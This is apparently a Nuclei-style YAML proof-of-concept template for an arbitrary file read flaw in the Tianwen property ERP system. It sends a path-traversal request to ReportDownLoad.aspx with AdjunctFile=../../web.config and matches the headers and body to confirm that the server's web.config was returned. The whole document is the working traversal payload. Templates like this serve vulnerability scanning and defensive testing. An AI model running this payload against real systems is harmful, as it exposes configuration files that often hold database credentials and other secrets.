id: poc-yaml-tianwen-wuye-erp-reportdownload-aspx-anyfile-read
info:
  name: 天问物业ERP系统 ReportDownLoad.aspx 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 文件读取

http:
  - method: GET
    path:
      - "{{BaseURL}}/HM/M_Main/Club/ReportDownLoad.aspx?AdjunctFile=../../web.config"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "filename=web.config"
      - type: word
        part: header
        words:
          - "application/octet-stream"
      - type: word
        part: body
        words:
          - "<configuration>"
